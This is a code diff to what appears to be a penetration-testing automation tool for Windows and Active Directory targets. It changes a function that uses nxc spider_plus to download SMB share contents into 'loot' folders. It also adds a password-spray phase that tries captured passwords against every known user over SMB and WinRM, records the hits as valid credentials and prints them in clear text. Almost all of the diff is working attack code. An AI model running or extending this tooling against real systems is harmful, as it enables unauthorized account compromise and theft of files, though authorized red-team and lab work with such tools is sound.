@@ -1033,12 +1033,18 @@ def _ad_core(
 def _smb_spider(
     ip: str, user: str, pw: str,
     runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
+    *, user_dir: "Path | None" = None,
 ) -> None:
-    """Download interesting files from accessible SMB shares to loot/creds_smb/<user>/."""
+    """Download interesting files from accessible SMB shares.
+
+    Writes to user_dir/smb/ when user_dir is provided (followup mode),
+    otherwise to loot/creds_smb/<user>/ (creds mode).
+    """
     if "nxc" not in available:
         return
-    smb_loot = ws.loot_dir / "creds_smb" / user
+    smb_loot = (user_dir / "smb") if user_dir else (ws.loot_dir / "creds_smb" / user)
     smb_loot.mkdir(parents=True, exist_ok=True)
+    display_path = f"loot/{user_dir.name}/smb/" if user_dir else f"loot/creds_smb/{user}/"
     cmd = [
         "nxc", "smb", ip,
         "-u", user, "-p", pw,
@@ -1046,17 +1052,17 @@ def _smb_spider(
         "-o", "DOWNLOAD_FLAG=True",
         f"OUTPUT_FOLDER={smb_loot}",
     ]
-    findings.cmd(f"nxc smb {ip} -u {user} -p *** -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=loot/creds_smb/{user}/")
+    findings.cmd(f"nxc smb {ip} -u {user} -p *** -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER={display_path}")
     runner.run(cmd, f"creds_smb_spider_{user}", timeout=180)
     # Exclude spider_plus metadata JSON (IP-named file) from file listing
     files = [f for f in smb_loot.rglob("*") if f.is_file() and not re.match(r"\d+\.\d+\.\d+\.\d+\.json", f.name)]
     if files:
-        findings.bullet(f"**{len(files)} SMB files downloaded** → `loot/creds_smb/{user}/`")
+        findings.bullet(f"**{len(files)} SMB files downloaded** → `{display_path}`")
         for f in sorted(files):
             rel = f.relative_to(smb_loot)
             findings.bullet(f"  `{rel}` ({f.stat().st_size} B)")
-        findings.add_summary(f"SMB files downloaded for {user}: {len(files)} files in loot/creds_smb/{user}/")
-        print(f"        [+] {len(files)} SMB files downloaded → loot/creds_smb/{user}/")
+        findings.add_summary(f"SMB files downloaded for {user}: {len(files)} files in {display_path}")
+        print(f"        [+] {len(files)} SMB files downloaded → {display_path}")
         _parse_gpp_cpassword(files, findings, ws, available)
     else:
         print(f"        [-] No files downloaded from SMB")
@@ -1116,6 +1122,7 @@ def _handle_cpassword(cpassword: str, source: str, findings: ServiceBuffer, ws: 
 def _creds_smb(
     ip: str, port: int, domain: str | None, user: str, pw: str,
     runner: Runner, findings: ServiceBuffer, ws: Workspace, available: set[str],
+    *, user_dir: "Path | None" = None,
 ) -> None:
     findings.h4(f"SMB — {user}")
     if "nxc" not in available:
@@ -1128,7 +1135,7 @@ def _creds_smb(
     if "READ" in out or "WRITE" in out:
         ws.add_valid_cred(user, pw, f"SMB:{port}")
         print(f"        [+] {user}: SMB shares readable — spidering...")
-        _smb_spider(ip, user, pw, runner, findings, ws, available)
+        _smb_spider(ip, user, pw, runner, findings, ws, available, user_dir=user_dir)
 
 
 def _creds_winrm(
@@ -1463,6 +1470,86 @@ def _enumerate_services(
         findings.flush_service_buffer(buf)
 
 
+# ── Password spray ────────────────────────────────────────────────────────────
+
+def _spray_password(
+    ip: str,
+    password: str,
+    skip_user: str,
+    runner: Runner,
+    findings: "Findings",
+    ws: Workspace,
+    services: list[Service],
+    available: set[str],
+    label_prefix: str = "",
+) -> None:
+    """Spray password against all users in loot/users.txt, skipping skip_user."""
+    import tempfile as _tempfile, os as _os
+
+    users_file = ws.loot_dir / "users.txt"
+    if not users_file.exists():
+        return
+    spray_users = [
+        u.strip() for u in users_file.read_text().splitlines()
+        if u.strip() and u.strip().lower() != skip_user.lower()
+    ]
+    if not spray_users:
+        findings.note(f"Password spray: no other users in loot/users.txt to spray `{skip_user}`'s password against")
+        return
+
+    threshold = ws.lockout_threshold
+    findings.h3(f"Password Spray — `{skip_user}`'s password against {len(spray_users)} other user(s)")
+    if threshold == 0:
+        findings.bullet("No account lockout — spraying freely")
+    elif threshold > 0:
+        findings.note(f"**Lockout threshold: {threshold}** — spraying cautiously (one password)")
+    else:
+        findings.bullet("Lockout policy unknown — spraying cautiously")
+
+    open_tcp = {s.port for s in services if s.proto == "tcp"}
+    safe_pw = re.sub(r"[^a-z0-9]", "_", password.lower())[:16]
+
+    tmp = _tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
+    try:
+        tmp.write("\n".join(spray_users))
+        tmp.flush()
+        tmp.close()
+
+        if 445 in open_tcp and "nxc" in available:
+            cmd = ["nxc", "smb", ip, "-u", tmp.name, "-p", password,
+                   "--continue-on-success", "--no-bruteforce"]
+            findings.cmd(f"nxc smb {ip} -u [spray_list:{len(spray_users)}] -p *** --continue-on-success --no-bruteforce")
+            out = runner.run(cmd, f"{label_prefix}spray_smb_{safe_pw}", timeout=180)
+            for line in out.splitlines():
+                if "[+]" in line:
+                    m = re.search(r"\\(\S+)\s", line)
+                    if m:
+                        hit_user = m.group(1)
+                        ws.add_valid_cred(hit_user, password, "SMB")
+                        ws.add_cred(f"{hit_user}:{password}")
+                        findings.bullet(f"**SPRAY HIT SMB: `{hit_user}:{password}`**")
+                        findings.add_summary(f"Password spray: {hit_user} reuses {skip_user}'s password (SMB)")
+                        print(f"    [+] SPRAY: {hit_user}:{password} — valid on SMB!")
+
+        if 5985 in open_tcp and "nxc" in available:
+            cmd2 = ["nxc", "winrm", ip, "-u", tmp.name, "-p", password,
+                    "--continue-on-success", "--no-bruteforce"]
+            findings.cmd(f"nxc winrm {ip} -u [spray_list:{len(spray_users)}] -p *** --continue-on-success --no-bruteforce")
+            out2 = runner.run(cmd2, f"{label_prefix}spray_winrm_{safe_pw}", timeout=180)
+            for line in out2.splitlines():
+                if "[+]" in line:
+                    m2 = re.search(r"\\(\S+)\s", line)
+                    if m2:
+                        hit_user = m2.group(1)
+                        ws.add_valid_cred(hit_user, password, "WinRM")
+                        ws.add_cred(f"{hit_user}:{password}")
+                        findings.bullet(f"**SPRAY HIT WinRM: `{hit_user}:{password}`**")
+                        findings.add_summary(f"Password spray: {hit_user} reuses {skip_user}'s password (WinRM)")
+                        print(f"    [+] SPRAY: {hit_user}:{password} — valid on WinRM!")
+    finally:
+        _os.unlink(tmp.name)
+
+
 # ── Main entry ────────────────────────────────────────────────────────────────
 
 def run_creds_mode(
@@ -1502,5 +1589,12 @@ def run_creds_mode(
     # Phase 3: Per-service credentialed enumeration against discovered services
     print(f"\n[*] Phase 3: Per-service enumeration ({len(services)} service(s))...")
     _enumerate_services(ip, domain, creds, services, runner, findings, ws, available)
+
+    # Phase 4: Password spray — spray each provided password against other known users
+    users_file = ws.loot_dir / "users.txt"
+    if users_file.exists() and users_file.stat().st_size > 0:
+        print(f"\n[*] Phase 4: Password spray...")
+        for user, pw in creds:
+            _spray_password(ip, pw, user, runner, findings, ws, services, available)
 
     print(f"\n[+] Creds mode complete — {ws.findings_path}")
